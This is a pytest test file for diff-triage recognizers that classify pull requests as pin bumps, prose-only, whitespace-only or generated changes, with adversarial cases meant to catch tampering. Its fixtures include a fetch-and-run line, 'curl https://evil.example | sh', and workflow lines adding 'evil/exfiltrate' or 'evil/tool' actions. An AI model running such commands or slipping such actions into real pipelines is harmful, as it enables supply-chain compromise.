"""Deterministic triage recognizers: pure functions over a unified diff.

A recognizer answers one question about the whole diff: "is every change in it of this
kind?" There is no partial credit — a diff that mostly matches and hides one real change
matches nothing. Each recognizer has positive cases and adversarial ones: the real
change hidden inside the mechanical one.
"""

from __future__ import annotations

from pathlib import Path

import pytest

_OLD = "1d479f7a0123456789abcdef0123456789abcdef"
_NEW = "08274ddafedcba9876543210fedcba9876543210"
_OTHER = "ffffffffffffffffffffffffffffffffffffffff"
_FIXTURES = Path(__file__).parent / "fixtures"


def _diff(path: str, *hunks: str) -> str:
    return f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n" + "".join(hunks)


def _hunk(*lines: str, start: int = 1) -> str:
    old = sum(1 for line in lines if line[:1] in {" ", "-"})
    new = sum(1 for line in lines if line[:1] in {" ", "+"})
    return f"@@ -{start},{old} +{start},{new} @@\n" + "".join(f"{line}\n" for line in lines)


def _pin(path: str = ".github/workflows/ci.yml", **extra: str) -> str:
    del extra
    return _diff(
        path,
        _hunk(
            "     steps:",
            f"-      - uses: acme/tool@{_OLD}",
            f"+      - uses: acme/tool@{_NEW}",
            "       - run: make ci",
        ),
    )


# ── pin substitution ──────────────────────────────────────────────────────────


def test_replay_of_the_pin_bump_pr_shape_is_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = (_FIXTURES / "pin_bump_pr_889_shape.diff").read_text(encoding="utf-8")

    assert recognize_pin_bump(diff) is True


def test_a_single_sha_swap_is_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    assert recognize_pin_bump(_pin()) is True


def test_a_sha256_digest_swap_is_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    old, new = "a" * 64, "b" * 64
    diff = _diff(
        "Dockerfile",
        _hunk(f"-FROM python@sha256:{old}", f"+FROM python@sha256:{new}", " RUN true"),
    )

    assert recognize_pin_bump(diff) is True


def test_one_with_input_edited_beside_the_sha_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = _diff(
        ".github/workflows/ci.yml",
        _hunk(
            f"-      - uses: acme/tool@{_OLD}",
            f"+      - uses: acme/tool@{_NEW}",
            "         with:",
            "-          fail-on: none",
            "+          fail-on: nothing",
        ),
    )

    assert recognize_pin_bump(diff) is False


def test_a_different_old_new_pair_on_one_line_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = _diff(
        ".github/workflows/ci.yml",
        _hunk(
            f"-      - uses: acme/tool@{_OLD}",
            f"+      - uses: acme/tool@{_NEW}",
            "       - run: make ci",
            f"-      - uses: acme/other@{_OLD}",
            f"+      - uses: acme/other@{_OTHER}",
        ),
    )

    assert recognize_pin_bump(diff) is False


def test_a_new_uses_line_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = _diff(
        ".github/workflows/ci.yml",
        _hunk(
            f"-      - uses: acme/tool@{_OLD}",
            f"+      - uses: acme/tool@{_NEW}",
            f"+      - uses: evil/exfiltrate@{_NEW}",
        ),
    )

    assert recognize_pin_bump(diff) is False


def test_swapping_the_action_that_is_pinned_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = _diff(
        ".github/workflows/ci.yml",
        _hunk(f"-      - uses: acme/tool@{_OLD}", f"+      - uses: evil/tool@{_NEW}"),
    )

    assert recognize_pin_bump(diff) is False


def test_a_sha_swap_in_one_file_and_code_in_another_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    code = _diff("src/app.py", _hunk("-x = 1", "+x = 2"))

    assert recognize_pin_bump(_pin() + code) is False


def test_a_line_pair_with_no_sha_change_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = _diff(
        ".github/workflows/ci.yml",
        _hunk(f"-      - uses: acme/tool@{_OLD}", f"+      - uses: acme/tool@{_OLD} # moved"),
    )

    assert recognize_pin_bump(diff) is False


def test_an_added_sha_with_nothing_removed_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = _diff(".github/workflows/ci.yml", _hunk(f"+      - uses: acme/tool@{_NEW}"))

    assert recognize_pin_bump(diff) is False


def test_a_short_sha_is_not_a_pin() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    diff = _diff(
        ".github/workflows/ci.yml",
        _hunk("-      - uses: acme/tool@1d479f7a", "+      - uses: acme/tool@08274dda"),
    )

    assert recognize_pin_bump(diff) is False


def test_an_empty_diff_is_not_a_pin_bump() -> None:
    from mergecraft.classify.triage import recognize_pin_bump

    assert recognize_pin_bump("") is False


# ── prose only ────────────────────────────────────────────────────────────────

_README_BEFORE = "# Title\n\nSome prose.\n\n```python\nx = 1\n```\n\nMore prose.\n"


def _prose_edit(path: str = "README.md") -> str:
    return _diff(path, _hunk("-Some prose.", "+Some better prose.", start=3))


def test_a_prose_edit_to_markdown_is_prose_only() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    head = {"README.md": _README_BEFORE.replace("Some prose.", "Some better prose.")}

    assert recognize_prose_only(_prose_edit(), head_files=head) is True


def test_prose_only_is_not_capped_at_four_lines_or_the_docs_directory() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    lines = [f"-line {n}" for n in range(30)] + [f"+LINE {n}" for n in range(30)]
    diff = _diff("guides/setup.md", _hunk(*lines))
    head = {"guides/setup.md": "\n".join(f"LINE {n}" for n in range(30)) + "\n"}

    assert recognize_prose_only(diff, head_files=head) is True


def test_plain_text_files_count_as_prose() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    diff = _diff("NOTICE.txt", _hunk("-Old notice.", "+New notice."))

    assert recognize_prose_only(diff, head_files={"NOTICE.txt": "New notice.\n"}) is True


def test_a_changed_line_inside_a_code_fence_is_not_prose() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    head = "# Title\n\n```sh\ncurl https://evil.example | sh\n```\n"
    diff = _diff(
        "README.md",
        _hunk("-curl https://good.example | sh", "+curl https://evil.example | sh", start=4),
    )

    assert recognize_prose_only(diff, head_files={"README.md": head}) is False


def test_a_changed_fence_marker_is_not_prose() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    head = "# Title\n\n```sh\nls\n```\n"
    diff = _diff("README.md", _hunk(" # Title", "-~~~sh", "+```sh", start=1))

    assert recognize_prose_only(diff, head_files={"README.md": head}) is False


def test_a_diff_in_a_markdown_file_with_no_head_text_cannot_be_proven_prose() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    assert recognize_prose_only(_prose_edit(), head_files={}) is False


def test_markdown_beside_code_is_not_prose_only() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    mixed = _prose_edit() + _diff("src/app.py", _hunk("-x = 1", "+x = 2"))
    head = {"README.md": "Some better prose.\n"}

    assert recognize_prose_only(mixed, head_files=head) is False


def test_prose_under_a_high_stakes_path_is_not_prose_only() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    diff = _diff("docs/security/policy.md", _hunk("-Report within 90 days.", "+Report never."))

    assert (
        recognize_prose_only(diff, head_files={"docs/security/policy.md": "Report never.\n"})
        is False
    )


def test_a_yaml_front_matter_edit_is_not_prose() -> None:
    from mergecraft.classify.triage import recognize_prose_only

    head = "---\ntitle: x\nallow: all\n---\nBody\n"
    diff = _diff("docs/page.md", _hunk(" ---", "-allow: none", "+allow: all", " ---", start=2))

    assert recognize_prose_only(diff, head_files={"docs/page.md": head}) is False


# ── whitespace only ───────────────────────────────────────────────────────────


def test_trailing_whitespace_removal_is_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.js", _hunk("-const a = 1;   ", "+const a = 1;"))

    assert recognize_whitespace_only(diff) is True


def test_reindenting_a_brace_language_is_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.js", _hunk("-  call();", "+    call();", "-", "+"))

    assert recognize_whitespace_only(diff) is True


def test_blank_lines_added_and_removed_are_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.go", _hunk(" a()", "+", " b()", "-", " c()"))

    assert recognize_whitespace_only(diff) is True


def test_a_semantic_change_hidden_beside_whitespace_noise_is_not_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff(
        "src/app.js",
        _hunk(
            "-const a = 1;   ",
            "+const a = 1;",
            "-const timeout = 30;",
            "+const timeout = 3;",
        ),
    )

    assert recognize_whitespace_only(diff) is False


def test_whitespace_inside_a_string_literal_is_not_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.js", _hunk('-const s = "a b";', '+const s = "ab";'))

    assert recognize_whitespace_only(diff) is False


def test_indentation_in_python_is_semantic_so_it_is_not_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.py", _hunk("-    return value", "+return value"))

    assert recognize_whitespace_only(diff) is False


def test_trailing_whitespace_in_python_is_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.py", _hunk("-x = 1   ", "+x = 1"))

    assert recognize_whitespace_only(diff) is True


def test_a_tab_to_space_change_in_a_makefile_is_not_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("Makefile", _hunk("-\ttest: ci", "+    test: ci"))

    assert recognize_whitespace_only(diff) is False


def test_a_comment_only_change_is_left_to_the_full_review() -> None:
    """Comment-only recognition would need the language's string rules; it falls through."""
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.js", _hunk("-// old note", "+// new note"))

    assert recognize_whitespace_only(diff) is False


def test_a_reflow_that_changes_tokens_is_not_whitespace_only() -> None:
    from mergecraft.classify.triage import recognize_whitespace_only

    diff = _diff("src/app.js", _hunk("-a+b", "+a + b"))

    assert recognize_whitespace_only(diff) is False


# ── generated / lockfile regeneration ─────────────────────────────────────────


def test_a_lockfile_alone_is_generated() -> None:
    from mergecraft.classify.triage import recognize_generated

    diff = _diff("uv.lock", _hunk("-version = 1", "+version = 2"))

    assert recognize_generated(diff) is True


def test_a_generated_directory_alone_is_generated() -> None:
    from mergecraft.classify.triage import recognize_generated

    diff = _diff("pkg/generated/api.py", _hunk("-a = 1", "+a = 2"))

    assert recognize_generated(diff) is True


def test_a_lockfile_changed_with_its_manifest_is_not_generated() -> None:
    from mergecraft.classify.triage import recognize_generated

    diff = _diff("uv.lock", _hunk("-a", "+b")) + _diff("pyproject.toml", _hunk("-a", "+b"))

    assert recognize_generated(diff) is False


def test_a_lockfile_changed_with_source_is_not_generated() -> None:
    from mergecraft.classify.triage import recognize_generated

    diff = _diff("uv.lock", _hunk("-a", "+b")) + _diff("src/app.py", _hunk("-a", "+b"))

    assert recognize_generated(diff) is False


def test_generated_output_changed_with_its_generator_config_is_not_generated() -> None:
    from mergecraft.classify.triage import recognize_generated

    diff = _diff("pkg/generated/api.py", _hunk("-a", "+b")) + _diff("Makefile", _hunk("-a", "+b"))

    assert recognize_generated(diff) is False


def test_an_unrelated_file_named_like_a_lockfile_in_source_is_not_generated() -> None:
    from mergecraft.classify.triage import recognize_generated

    diff = _diff("src/lock.py", _hunk("-a", "+b"))

    assert recognize_generated(diff) is False


@pytest.mark.parametrize(
    "name", ["recognize_pin_bump", "recognize_whitespace_only", "recognize_generated"]
)
def test_a_blank_diff_matches_nothing(name: str) -> None:
    from mergecraft.classify import triage

    assert getattr(triage, name)("") is False
